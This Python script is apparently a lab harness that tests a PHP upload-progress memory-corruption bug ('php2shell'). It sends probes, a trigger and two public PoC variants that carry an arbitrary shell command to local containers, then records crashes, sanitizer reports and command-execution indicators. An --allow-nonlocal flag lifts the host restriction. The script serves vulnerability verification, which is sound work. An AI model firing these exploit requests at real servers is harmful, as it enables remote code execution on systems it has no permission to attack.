#!/usr/bin/env python3
"""Local-only php2shell verification harness.

This script sends the published trigger and the public PoC-shaped bodies to the
lab in ../compose.yaml. It does not contain an address leak, ASLR bypass, or a
remote-target mode. Non-lab hosts are refused unless --allow-nonlocal is set.
"""

from __future__ import annotations

import argparse
import glob
import hashlib
import json
import os
import secrets
import socket
import ssl
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

import public_pocs

ALLOWED_HOSTS = {
    "127.0.0.1",
    "localhost",
    "::1",
    "php-vuln",
    "php-mitigated",
    "php-patched",
    "nginx",
}


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def preview(data: bytes, limit: int = 500) -> str:
    return data[:limit].decode("utf-8", "replace")


def decode_chunked(body: bytes) -> bytes:
    out = bytearray()
    pos = 0
    while True:
        line_end = body.find(b"\r\n", pos)
        if line_end < 0:
            break
        size_text = body[pos:line_end].split(b";", 1)[0].strip()
        try:
            size = int(size_text, 16)
        except ValueError:
            break
        pos = line_end + 2
        if size == 0:
            break
        out += body[pos:pos + size]
        pos += size + 2
    return bytes(out)


def parse_response(raw: bytes) -> dict:
    head, _, body = raw.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n") if head else []
    status = None
    headers: dict[str, str] = {}
    if lines:
        parts = lines[0].split(b" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                status = None
    for line in lines[1:]:
        if b":" not in line:
            continue
        key, value = line.split(b":", 1)
        headers[key.decode("latin1").strip().lower()] = value.decode("latin1").strip()
    if headers.get("transfer-encoding", "").lower() == "chunked":
        body = decode_chunked(body)
    return {"status": status, "headers": headers, "body": body}


def send_stream(
    url: str,
    phase1: bytes,
    phase2: bytes | None = None,
    stall: float = 0.0,
    content_type: str = "application/octet-stream",
    sid: str | None = None,
    user_agent: str = "php2shell-lab",
    timeout: float = 60.0,
) -> dict:
    parsed = urlparse(url)
    host = parsed.hostname
    if host is None:
        raise ValueError(f"invalid URL: {url}")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    body_len = len(phase1) + (len(phase2) if phase2 else 0)
    headers = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}:{port}",
        f"User-Agent: {user_agent}",
        f"Content-Type: {content_type}",
        f"Content-Length: {body_len}",
        "Connection: close",
    ]
    if sid:
        headers.append(f"Cookie: PHPSESSID={sid}")
    request = ("\r\n".join(headers) + "\r\n\r\n").encode("latin1") + phase1

    started = time.time()
    timed_out = False
    error = None
    raw = b""
    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if parsed.scheme == "https":
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=host)
        sock.sendall(request)
        if phase2 is not None:
            if stall:
                time.sleep(stall)
            sock.sendall(phase2)
        sock.settimeout(timeout)
        chunks = []
        while True:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                timed_out = True
                break
            if not chunk:
                break
            chunks.append(chunk)
        raw = b"".join(chunks)
    except Exception as exc:  # noqa: BLE001
        error = f"{type(exc).__name__}: {exc}"
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass

    duration_ms = int((time.time() - started) * 1000)
    parsed_response = parse_response(raw)
    return {
        "status": parsed_response["status"],
        "headers": parsed_response["headers"],
        "body": parsed_response["body"],
        "duration_ms": duration_ms,
        "timed_out": timed_out,
        "error": error,
        "request_bytes": len(request),
    }


def scan_logs(log_dir: str, since: float) -> dict:
    reports = []
    errors = []
    if not os.path.isdir(log_dir):
        return {"reports": reports, "errors": errors}
    for path in sorted(glob.glob(os.path.join(log_dir, "*"))):
        if not os.path.isfile(path):
            continue
        try:
            if os.path.getmtime(path) < since - 1:
                continue
            with open(path, "rb") as fh:
                head = fh.read(16384)
        except OSError:
            continue
        text = head.decode("utf-8", "replace")
        if "AddressSanitizer" in text or "LeakSanitizer" in text:
            reports.append({"file": path, "head": text[:4000]})
        elif any(marker in text for marker in ("PHP Fatal error", "Segmentation fault", "SIGSEGV", "core dumped")):
            errors.append({"file": path, "head": text[:2000]})
    return {"reports": reports, "errors": errors}


class Recorder:
    def __init__(self, jsonl_path: str, raw_dir: str | None, save_raw: bool) -> None:
        self.jsonl_path = jsonl_path
        self.raw_dir = raw_dir
        self.save_raw = save_raw
        self.seq = 0
        if os.path.exists(jsonl_path):
            with open(jsonl_path, "rb") as fh:
                self.seq = sum(1 for _ in fh)
        Path(jsonl_path).parent.mkdir(parents=True, exist_ok=True)
        if save_raw and raw_dir:
            Path(raw_dir).mkdir(parents=True, exist_ok=True)

    def record(
        self,
        mode: str,
        url: str,
        request_meta: dict,
        response: dict,
        observations: dict,
        request_body: bytes | None = None,
        response_body: bytes | None = None,
    ) -> None:
        self.seq += 1
        entry = {
            "seq": self.seq,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
            "mode": mode,
            "request": request_meta,
            "response": {
                "status": response.get("status"),
                "headers": response.get("headers"),
                "body_len": len(response.get("body", b"")),
                "body_sha256": sha256(response.get("body", b"")),
                "body_preview": preview(response.get("body", b"")),
                "timed_out": response.get("timed_out"),
                "error": response.get("error"),
                "duration_ms": response.get("duration_ms"),
            },
            "observations": observations,
        }
        with open(self.jsonl_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry, ensure_ascii=False) + "\n")
        if self.save_raw and self.raw_dir:
            if request_body is not None:
                Path(self.raw_dir, f"{self.seq:04d}-{mode}-req.bin").write_bytes(request_body)
            if response_body is not None:
                Path(self.raw_dir, f"{self.seq:04d}-{mode}-res.bin").write_bytes(response_body)


def ensure_allowed(url: str, allow_nonlocal: bool) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise SystemExit(f"refusing non-HTTP target: {url}")
    if parsed.hostname not in ALLOWED_HOSTS and not allow_nonlocal:
        raise SystemExit(
            f"refusing non-lab host {parsed.hostname!r}; "
            "use --allow-nonlocal only for a host you own"
        )
    if parsed.hostname not in ALLOWED_HOSTS:
        print(f"[!] non-lab target allowed explicitly: {parsed.hostname}", file=sys.stderr)


def new_sid() -> str:
    return "php2shell" + secrets.token_hex(11) + "a"


def parse_json_body(response: dict) -> dict | None:
    body = response.get("body", b"")
    if not body:
        return None
    try:
        return json.loads(body.decode("utf-8", "replace"))
    except json.JSONDecodeError:
        return None


def probe(url: str, label: str, recorder: Recorder, timeout: float, asan_dir: str) -> dict:
    sid = new_sid()
    boundary = "----probe" + secrets.token_hex(8)
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        "x\r\n"
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="f"; filename="probe.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
        "PROBE\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    started = time.time()
    response = send_stream(
        url,
        body,
        content_type=f"multipart/form-data; boundary={boundary}",
        sid=sid,
        user_agent=f"php2shell-probe-{label}",
        timeout=timeout,
    )
    data = parse_json_body(response)
    progress = data.get("upload_progress") if data else None
    files = data.get("files") if data else None
    logs = scan_logs(asan_dir, started)
    observations = {
        "label": label,
        "upload_progress_present": progress is not None,
        "file_parsed": bool(files and files.get("f")),
        "file_error": (files or {}).get("f", {}).get("error") if files else None,
        "session_id": sid,
        "asan_reports": logs["reports"],
        "fatal_errors": logs["errors"],
    }
    recorder.record(
        mode=f"probe-{label}",
        url=url,
        request_meta={
            "method": "POST",
            "url": url,
            "headers": {"Content-Type": f"multipart/form-data; boundary={boundary}", "Cookie": f"PHPSESSID={sid}"},
            "body_len": len(body),
            "body_sha256": sha256(body),
        },
        response=response,
        observations=observations,
        request_body=body,
        response_body=response.get("body"),
    )
    print(
        f"[probe:{label}] status={response['status']} "
        f"upload_progress={'present' if progress is not None else 'absent'} "
        f"file_parsed={observations['file_parsed']} file_error={observations['file_error']}"
    )
    return observations


def trigger(url: str, stalled: bool, recorder: Recorder, stall: float, timeout: float, asan_dir: str) -> dict:
    sid = new_sid()
    body = public_pocs.build_trigger(sid)
    if stalled:
        split = public_pocs.trigger_split_point(body)
        phase1, phase2 = body[:split], body[split:]
        started = time.time()
        response = send_stream(
            url,
            phase1,
            phase2=phase2,
            stall=stall,
            content_type="multipart/form-data; boundary=----b",
            sid=sid,
            user_agent="php2shell-trigger-stall",
            timeout=timeout,
        )
        mode = "trigger-stall"
    else:
        started = time.time()
        response = send_stream(
            url,
            body,
            content_type="multipart/form-data; boundary=----b",
            sid=sid,
            user_agent="php2shell-trigger-single",
            timeout=timeout,
        )
        mode = "trigger-single"

    data = parse_json_body(response)
    progress = data.get("upload_progress") if data else None
    file_info = None
    if progress and isinstance(progress.get("files"), list) and progress["files"]:
        file_info = progress["files"][0]
    logs = scan_logs(asan_dir, started)
    observations = {
        "label": mode,
        "body_len": len(body),
        "upload_progress_present": progress is not None,
        "bytes_processed": (progress or {}).get("bytes_processed"),
        "done": (progress or {}).get("done"),
        "file_bytes_processed": (file_info or {}).get("bytes_processed"),
        "file_error": (file_info or {}).get("error"),
        "session_id": sid,
        "asan_reports": logs["reports"],
        "fatal_errors": logs["errors"],
    }
    recorder.record(
        mode=mode,
        url=url,
        request_meta={
            "method": "POST",
            "url": url,
            "headers": {"Content-Type": "multipart/form-data; boundary=----b", "Cookie": f"PHPSESSID={sid}"},
            "body_len": len(body),
            "body_sha256": sha256(body),
        },
        response=response,
        observations=observations,
        request_body=body,
        response_body=response.get("body"),
    )
    print(
        f"[{mode}] status={response['status']} "
        f"progress={'present' if progress is not None else 'absent'} "
        f"bytes_processed={observations['bytes_processed']} "
        f"file_bytes={observations['file_bytes_processed']} "
        f"done={observations['done']} "
        f"asan={'yes' if logs['reports'] else 'no'}"
    )
    return observations


def run_poc(
    url: str,
    which: str,
    recorder: Recorder,
    command: str,
    call: int,
    stall: float,
    timeout: float,
    rce_pattern: str,
    asan_dir: str,
) -> dict:
    sid = new_sid()
    command_bytes = command.encode()
    if which == "618":
        phase1, tail, meta = public_pocs.build618(sid, command_bytes, call)
        boundary = meta["boundary"]
    else:
        phase1, tail, meta = public_pocs.build619(sid, command_bytes, call)
        boundary = meta["boundary"]
    body = phase1 + tail
    started = time.time()
    response = send_stream(
        url,
        phase1,
        phase2=tail,
        stall=stall,
        content_type=f"multipart/form-data; boundary={boundary}",
        sid=sid,
        user_agent=f"php2shell-poc{which}",
        timeout=timeout,
    )
    logs = scan_logs(asan_dir, started)
    pattern = rce_pattern.encode()
    rce = pattern in response.get("body", b"")
    status = response.get("status")
    crashed = status is None or (isinstance(status, int) and status >= 500)
    observations = {
        "variant": which,
        "meta": meta,
        "command": command,
        "call": hex(call),
        "rce_indicator": rce,
        "rce_pattern": rce_pattern,
        "worker_or_http_failure": crashed,
        "asan_reports": logs["reports"],
        "fatal_errors": logs["errors"],
        "session_id": sid,
    }
    recorder.record(
        mode=f"poc{which}",
        url=url,
        request_meta={
            "method": "POST",
            "url": url,
            "headers": {"Content-Type": f"multipart/form-data; boundary={boundary}", "Cookie": f"PHPSESSID={sid}"},
            "body_len": len(body),
            "body_sha256": sha256(body),
        },
        response=response,
        observations=observations,
        request_body=body,
        response_body=response.get("body"),
    )
    print(
        f"[poc{which}] status={status} resp={len(response.get('body', b''))}B "
        f"rce={'YES' if rce else 'no'} "
        f"asan={'yes' if logs['reports'] else 'no'} "
        f"failure={'yes' if crashed else 'no'}"
    )
    return observations


def main() -> int:
    parser = argparse.ArgumentParser(description="Local php2shell verification harness")
    parser.add_argument("--mode", choices=["probe", "trigger", "poc618", "poc619", "all"], default="all")
    parser.add_argument("--target", default="http://127.0.0.1:8080/index.php")
    parser.add_argument("--mitigated", default="http://127.0.0.1:8081/index.php")
    parser.add_argument("--command", default="id")
    parser.add_argument("--rce-pattern", default="uid=")
    parser.add_argument("--call", default="0", help="hex address for the forged call target; default 0")
    parser.add_argument("--stall", type=float, default=1.5)
    parser.add_argument("--timeout", type=float, default=60.0)
    parser.add_argument("--jsonl", default="data/evidence.jsonl")
    parser.add_argument("--asan-dir", default="data/logs")
    parser.add_argument("--raw-dir", default="data/raw")
    parser.add_argument("--save-raw", action="store_true")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    ensure_allowed(args.target, args.allow_nonlocal)
    ensure_allowed(args.mitigated, args.allow_nonlocal)
    call = int(args.call, 0)
    recorder = Recorder(args.jsonl, args.raw_dir, args.save_raw)

    print(f"[*] target={args.target}")
    print(f"[*] mitigated={args.mitigated}")
    print(f"[*] evidence={args.jsonl}")

    results: dict[str, dict] = {}
    if args.mode in ("probe", "all"):
        results["probe_vuln"] = probe(args.target, "vuln", recorder, args.timeout, args.asan_dir)
        results["probe_mitigated"] = probe(args.mitigated, "mitigated", recorder, args.timeout, args.asan_dir)
    if args.mode in ("trigger", "all"):
        results["trigger_single"] = trigger(args.target, False, recorder, args.stall, args.timeout, args.asan_dir)
        results["trigger_stall"] = trigger(args.target, True, recorder, args.stall, args.timeout, args.asan_dir)
    if args.mode in ("poc618", "all"):
        results["poc618"] = run_poc(args.target, "618", recorder, args.command, call, args.stall, args.timeout, args.rce_pattern, args.asan_dir)
    if args.mode in ("poc619", "all"):
        results["poc619"] = run_poc(args.target, "619", recorder, args.command, call, args.stall, args.timeout, args.rce_pattern, args.asan_dir)
    if args.mode == "all":
        results["probe_after"] = probe(args.target, "after", recorder, args.timeout, args.asan_dir)

    rce = any(r.get("rce_indicator") for r in results.values() if isinstance(r, dict))
    asan = any(
        r.get("asan_reports")
        for r in results.values()
        if isinstance(r, dict)
    )
    failure = any(r.get("worker_or_http_failure") for r in results.values() if isinstance(r, dict))

    print("[*] summary")
    print(f"    rce={rce} asan={asan} http_or_worker_failure={failure}")
    if rce:
        print("    RESULT: command execution indicator observed")
        return 2
    if asan:
        print("    RESULT: sanitizer report observed; inspect data/logs")
        return 1
    if failure:
        print("    RESULT: HTTP or worker failure observed; inspect data/logs")
        return 1
    print("    RESULT: no RCE or sanitizer report in this run")
    return 0


if __name__ == "__main__":
    sys.exit(main())
